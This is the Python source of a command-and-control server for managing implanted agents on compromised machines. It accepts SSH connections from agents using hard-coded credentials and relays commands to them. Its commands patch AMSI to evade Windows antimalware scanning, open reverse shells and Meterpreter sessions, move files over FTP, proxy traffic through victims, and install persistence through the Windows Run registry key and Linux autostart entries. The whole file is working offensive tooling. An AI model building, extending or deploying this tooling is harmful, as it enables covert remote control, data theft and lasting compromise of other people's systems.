#!/usr/bin/python3

'''
Multi-Threaded Command and Control server with paramiko

Author: Karim (@fsociety_py00)(github.com/cpu0x00)
'''

import paramiko
import socket
import cmd
import os
from Crypto.PublicKey import RSA
import io
import threading
from time import sleep
import sys
import pickle
import struct
import argparse
from threading import Thread
import base64
import zlib
import re
from ftplib import FTP_TLS
from ftplib import FTP
from random import choice
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import TLS_FTPHandler
from pyftpdlib.servers import FTPServer
import logging
import pwncat.manager
# from custom_scripts import https_server
# --- static vars --- #


DEBUG = False # setting this to True will print the channel detailes

USERNAME = 'fsociety'
PASSWORD = 'fsocietyC2'
SERVER = '0.0.0.0' # to listen on every interface
FTPPORT = 2211


# --- end static vars --- #

# paramiko ssh server #

class C2_SERVER(paramiko.ServerInterface): # SSH Server 
	def check_channel_request(self, kind, chanid):
		if DEBUG:
			print(kind)
		if kind == 'session' or kind == 'sftp':

			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
	def check_auth_password(self, username, password):
		if (username == USERNAME) and (password == PASSWORD):
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED


def system_shell():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # making the socket reusable multiple times for channel hopping
	
	s.bind(('0.0.0.0', 65000))


	s.listen(5)

	conn,addr = s.accept()

	while True:
		ans = conn.recv(4096).decode()
		print(ans, end='')
		command = input()
		command += "\n"
		conn.send(command.encode())
		sleep(0.2)
		if command == 'agent\n':
			print('[SERVER] switiching to the agent mode ')
			break

		# sys.stdout.write("\033[A" + ans.split("\n")[-1])
		print("\033[A" + ans.split("\n")[-1])

def send_file(file):
	logging.basicConfig(level=logging.CRITICAL)

	class ftphandler(TLS_FTPHandler):
		def on_disconnect(self):
			print('[*] done')
			server.close_all()

	dir_path = os.path.dirname(os.path.realpath(file))

	authorizer = DummyAuthorizer()

	authorizer.add_user("cpu", "fsociety", dir_path, perm="elradfmwMT")

	handler = ftphandler

	handler.certfile = 'ssl/c2server.key'

	handler.authorizer = authorizer
	print('[*] communicating over TLS/SSL encrypted channel')
	server = FTPServer(("0.0.0.0", FTPPORT), handler)
	print(f'[*] uploading: {dir_path}/{file}')

	server.serve_forever()

def receive_file(host,port,file):

	ftpclient = FTP() # creating an ftp client object
	ftpclient.connect(host=host, port=port) # connecting to the host
	ftpclient.login(user='cpu', passwd='fsociety') # logging in with the creds
	# print('[*] communicating over TLS/SSL encrypted channel ')

	# print(f'[*] downloading {file}')

	with open(file, 'wb') as fp:
	    ftpclient.retrbinary(f'RETR {file}', fp.write)
	    print('[*] done!')

def run_thread(function):
	# rogue function to wrap another function to run in a parralel thread

	thread = threading.Thread(None, function)
	thread.start()



active_listeners = []
names = []
ip_by_agent = {}
agents = {}

def handle_agent(client, addr):

	print(f'\n[SERVER] agent from {addr[0]} checked in')

	key = RSA.generate(2048)

	RSA_PRIVATE_KEY = key.export_key()
	RSA_PUBLIC_KEY = key.publickey().export_key()

	paramiko_format_priv = io.StringIO(RSA_PRIVATE_KEY.decode())
	paramiko_format_pub =  io.StringIO(RSA_PUBLIC_KEY.decode())

	print('[INFO] generated RSA keypairs in memory, DISK is not touched')


	HOST_KEY = paramiko.RSAKey.from_private_key(file_obj=paramiko_format_priv)
	
	session = paramiko.Transport(client)
	session.add_server_key(HOST_KEY)
	

	c2_server = C2_SERVER() 

	session.start_server(server=c2_server)
	
	channel = session.accept()
	agents[f'agent{len(agents)+1}'] = channel
	ip_by_agent[f'agent{len(agents)}'] = addr[0]

	if channel is None:
		if DEBUG:
			print(f'[DEBUG] {channel}')
		
		exit('[ERROR] connection error, exiting...')


	confirm_msg = channel.recv(1024).decode()
	print(f'\n{confirm_msg}')
	channel.send(' ')
	
	userpattern = re.compile(r':.*')
	match = userpattern.findall(str(confirm_msg))
	user = ''.join(match).split(' ')[1]

	pattern = re.compile(r'\(.*\)')
	match = pattern.findall(str(confirm_msg))
	hostname = ''.join(match).replace('(', '').replace(')', '')#.split(' ')
	print(f'[SERVER] a communication channel opened with {hostname}, agent name: agent{len(agents)}')

	agent_ipv4 = ip_by_agent[f'agent{len(agents)}']

	names.append(f'agent{len(agents)}, machine: {hostname}, ipv4: {agent_ipv4}, user: {user}')
	names.append('------------------------------------------------------------')
	# print(channel)

def communicate(SERVER_PORT):
	# --- RSA keys to use with PARAMIKO
	
	active_listeners.append(f'listener -> 0.0.0.0:{SERVER_PORT}')
	active_listeners.append('----------------------------------')
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # initializes socket 
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # allows for the reuse of the port once established connection (useful for agent communction)

		sock.bind((SERVER, SERVER_PORT))
		sock.listen(5) # will give up on the connection after 5 tries 
		
		print(f'\n[SERVER] C2 server is up on 0.0.0.0:{SERVER_PORT}, waiting for connections...')

	
		while True:

			client, addr = sock.accept()
			

			hagent = threading.Thread(target=handle_agent, args=(client,addr))
			hagent.start()
	
	except KeyboardInterrupt:
		exit('\n[-] killing the server...')

	# --- the shell --- #


quotes = [

	'- the quiter you are, the more you will be able to hear.\n',
	'- trust the process.\n',
	'- Hack The Planet\n',
	"- powershell -c 'InV0K3-W0rldD0m1n4T10n' \n",
	'- to build something you need to know how to break it, to break it you need to know how it is built\n',
	'- m4k3 1t s1l3nt ;)\n',

]


class server_shell(cmd.Cmd):

	print(choice(quotes))
	prompt = f'c2server> '

	def default(self, arg): # generic_shell
		def exec_command():
			agent_name = arg.split(' ')[0]
			try:
				command = ' '.join(arg.split(' ')).replace(agent_name, '')
				agents[agent_name].send(command)
					
				output = agents[agent_name].recv(8192).decode()
				print(output)
				if command == '':
					pass					
			except Exception as e:
				print('an error occured:')
				print(e)

		sht = threading.Thread(target=exec_command)
		sht.start()

	def emptyline(self):
		print('', end='') # for not breaking the shell

	def postcmd(self, line,stop):
		print('', end='') # for not beaking the shell

	def do_agents(self,arg):
		'list all connected agents \nuse AGENT_NAME [COMMAND] to execute commands with the agent'
		print('Connected Agents:\n')
		for a in names:
			print(a)


	def do_listener(self,arg):
		'opens a listener on a specified port\
		\nusage: listener PORT\
		\nusage2: listener list -> lists all active listeners\
		\n[INFO] single listener can handle multiple agents'

		try:

			if arg == 'list':
				print('active listeners: \n')
				print('\n'.join(active_listeners))
			else:

				l2 = threading.Thread(target=communicate, args=(int(arg),) )
				l2.start()
		except:
			print('[-] usage: listener [PORT|list]>')

	def do_patch_amsi(self,arg):
		'patch AMSI in a powershell process entirely\
		\nusage: patch_amsi AGENT_NAME \
		\n[MAKE SURE TO HAVE A POWERSHELL PROCESS RUNNING]'
		
		agent_name = arg.split(' ')[0]
		agents[agent_name].send('patch_amsi')
		# def recieve_resp():
		print(agents[agent_name].recv(2048).decode())
		print(agents[agent_name].recv(2048).decode())
		print(agents[agent_name].recv(2048).decode())
		print(agents[agent_name].recv(2048).decode())
		print(agents[agent_name].recv(2048).decode())
		print(agents[agent_name].recv(2048).decode())
		print(agents[agent_name].recv(2048).decode())

		# t1 = Thread(target=recieve_resp)
		# t1.start()
		# t1.join()

	def do_upload(self,arg):
		'upload a file to the target system\nusage: upload AGENT_NAME FILE_TO_UPLOAD'
		agent_name = arg.split(' ')[0]
		agents[agent_name].send(f'upload {arg}')
		# print(f'[*] uploading ({arg}) to {addr[0]}')
			
		FILE = arg.split(' ')[1]
					
		ftpthread = threading.Thread(None, send_file(FILE))
		ftpthread.start()
		ftpthread.join()



	def do_download(self,arg): # implement download funtion
		'download a file from the target system\nusage: download AGENT_NAME FILE'
		
		agent_name = arg.split(' ')[0]
		agents[agent_name].send(f"download {arg.split(' ')[1]}")
		sleep(1)
		print(f"[*] downloading ({arg.split(' ')[0]}) form {agent_name}")

		FILE = arg.split(' ')[0]
		HOST = ip_by_agent[agent_name]
		file = receive_file(HOST, FTPPORT, FILE)

	def do_reverse_proxy(self,arg): # implement portforwarding funtion
		'reverse proxy functionality to use the agent to access services running locally from your machine\
		\nusage: reverse_proxy TARGET_IP PORT_TO_ACCESS_THE_LOCAL_SERVICE 127.0.0.1 SERVICE_PORT\
		\nIMPORTANT: RAW SOCKET NO ENCRYPTION'

		channel.send(f'reverse_proxy {arg}')

		print(channel.recv(2048).decode())
			

	def do_ttyshell(self,arg):
		'drop in a system shell instead of the agent shell [LINUX]\
		\nUSAGE: ttyshell AGENT_NAME\
		\n[IMPORTANT] to swtich back to the agent mode use the command (agent) in the shell\
		\n NOT ENCRYPTED'

		agent_name = arg.split(' ')[0]

		print(f'[SERVER] switiching to system shell mode on {agent_name}')
		agents[agent_name].send('ttyshell')
			# event = threading.Event()
		thread = threading.Thread(target=system_shell)
			
		thread.start()
		thread.join()

	def do_powershell_shell(self,arg):
		'drop in a system shell instead of the agent shell [powershell WINDOWS]\
		\nUSAGE: powershell_shell AGENT_NAME\
		\n[IMPORTANT] to swtich back to the agent mode use the command (agent) in the shell\
		\n NOT ENCRYPTED'

		print(f'[SERVER] switiching to system shell mode on {agent_name}')
		
		agent_name = arg.split(' ')[0]

		agents[agent_name].send('powershell_shell')
		thread = threading.Thread(target=system_shell)
			
		thread.start()
		thread.join()			
		

	def do_cmd_shell(self,arg):
		'drop in a system shell instead of the agent shell [cmd.exe WINDOWS]\
		\nUSAGE: cmd_shell AGENT_NAME\
		\n[IMPORTANT] to swtich back to the agent mode use the command (agent) in the shell\
		\nNOT ENCRYPTED'

		print(f'[SERVER] switiching to system shell mode on {agent_name}')
		agent_name = arg.split(' ')[0]

		agents[agent_name].send('cmd_shell')
		thread = threading.Thread(target=system_shell)
			
		thread.start()
		thread.join()

	def do_revshell(self,arg):
		'sends a reverse shell to a netcat listener\
		\nusage: revshell AGENT_NAME PORT \
		\nip address determined automatically by the agent\
		\n[IMPORTANT] raw socket is used, not encrypted '
		agent_name = arg.split(' ')[0]

		agents[agent_name].send(f"revshell {arg.split(' ')[1]}")

	def do_meterpreter(self,arg):
		'receive a meterpreter shell (IN MSFCONSOLE)\
		\nusage: meterpreter AGENT_NAME <LHOST> <LPORT>\
		\nexample: meterpreter 10.10.10.8 4545\
		\npayload: python/meterpreter_reverse_tcp'
		
		agent_name = arg.split(' ')[0]
		LHOST = arg.split(' ')[1]
		LPORT = arg.split(' ')[2]
		agents[agent_name].send(f'meterpreter {LHOST} {LPORT}')


		print('[*] activating a msf payload: (python/meterpreter_reverse_tcp)')
			

	def do_windows_persistence(self,arg):
		'applying a registry level persistence technique\
		\nfunction: edits the autorun registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) by adding an (rto) value that executes the agent once the user logs-in\
		\nusage: windows_persistence AGENT_NAME'
		print('[*] applying persistence...')

		agent_name = arg.split(' ')[0]
		agents[agent_name].send(f'windows_persistence')
		confirm_msg = agents[agent_name].recv(1024).decode()
		if 'rto' in str(confirm_msg):
			print(confirm_msg)
			print('[*] persistence applied')



	def do_linux_persistence(self,arg):			
		'applying an autorun persistence technique\
		\nfunction: adds an (rto.desktop) file in (/home/USERS/.config/autostart/) DIR to execute the agent once the user logs-in\
		\nusage: linux_persistence AGENT_NAME'

		print('[*] applying persistence...')
		agent_name = arg.split(' ')[0]
		agents[agent_name].send('linux_persistence')
		confirm_msg = agents[agent_name].recv(1024).decode()
		print(confirm_msg)



# try:

# 	server_shell().cmdloop()

# except KeyboardInterrupt:
# 	print('\n[-] Terminating agent... ')
# 	print('[-] Terminating server... ')

def pwncat_wrapper(port, platform):
	print(f'[SERVER] pwncat listening on 0.0.0.0:{port}')
	ncat_listner = socket.create_server(("0.0.0.0", port))
	client, addr = ncat_listner.accept()

	with pwncat.manager.Manager() as manager:
		session = manager.create_session(platform=platform, protocol='socket', client=client)
		manager.interactive()



def C2_MAIN():
	
	parser = argparse.ArgumentParser(epilog='(C)ommand and (C)ontrol Server')
	parser.add_argument('-port', type=int, help='port to start the server with, OPTIONAL ')
	parser.add_argument('-pwncat', help='use pwncat-cs instead of the main paramiko interface (-pwncat [linux|windows] ) [NOT ENCRYPTED]')
	arg = parser.parse_args()

	if arg.port and not arg.pwncat:
		try:

			server_shell().cmdloop()

		except KeyboardInterrupt:
			print('\n[-] Terminating agent... ')
			print('[-] Terminating server... ')
		
		communicate(arg.port)
			# C2_MAIN()
	if arg.port and arg.pwncat:
		pwncat_wrapper(arg.port, arg.pwncat)
	else:
		try:

			server_shell().cmdloop()

		except KeyboardInterrupt:
			print('\n[-] Terminating agent... ')
			print('[-] Terminating server... ')

if __name__ == "__main__":
	C2_MAIN()

